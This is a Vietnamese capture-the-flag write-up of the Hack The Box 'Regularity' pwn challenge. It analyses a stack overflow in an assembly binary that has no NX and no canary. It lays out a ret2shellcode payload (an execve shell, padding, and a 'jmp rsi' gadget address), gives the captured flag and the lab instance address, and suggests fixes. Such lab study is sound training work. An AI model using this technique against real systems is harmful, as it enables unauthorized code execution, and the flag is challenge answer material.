# Regularity — HTB TryOut (pwn, very easy)

## Tóm tắt
ELF64 tĩnh viết tay bằng assembly. **Non-PIE, không canary, `GNU_STACK = RWE`
(NX tắt)**. Hàm `read` đọc `0x110` (272) byte vào buffer `0x100` (256) byte →
tràn 8 byte đúng vào địa chỉ trả về. Không cần leak: `rsi` vẫn trỏ tới buffer và
có sẵn gadget `jmp rsi`, nên ret2shellcode ngay trên stack.

## Phân tích
```
read (0x40104b):
  sub  rsp, 0x100          ; buffer @ rsp (256B)
  lea  rsi, [rsp]          ; rsi = &buffer  (được bảo toàn qua syscall)
  mov  edx, 0x110          ; đọc 272 byte  -> tràn 16 byte
  syscall                  ; read(0, buffer, 0x110)
  add  rsp, 0x100 ; ret    ; ret lấy [buffer+0x100]  => offset 256 = RIP
```
Sau `read`, `rsi` = base buffer (không bị syscall phá). `_start` kết thúc bằng
`jmp rsi` tại `0x401041`. Ghi đè return address bằng `0x401041` → nhảy về đầu
buffer, nơi đặt shellcode; stack RWE nên shellcode chạy được.

## Khai thác
Payload 264 byte:
```
[ execve("/bin//sh") shellcode | NOP pad ]   = 256 byte  (chạy tại base buffer)
[ p64(0x401041)  "jmp rsi" ]                  = 8 byte    (ghi đè saved ret)
```
`python solve/solve.py HOST PORT` (raw socket, không cần pwntools) → shell → `cat flag.txt`.

Instance 154.57.164.82:31272 (2026-08-20):
`HTB{juMp1nG_w1tH_tH3_r3gIsT3rS?_828f9eeafefa8257fb4db8082624bca0}`

## Khắc phục
Đọc đúng kích thước buffer (`0x100`), bật NX (GNU_STACK không executable), thêm
stack canary/PIE. Không đặt shellcode-friendly RWE stack.
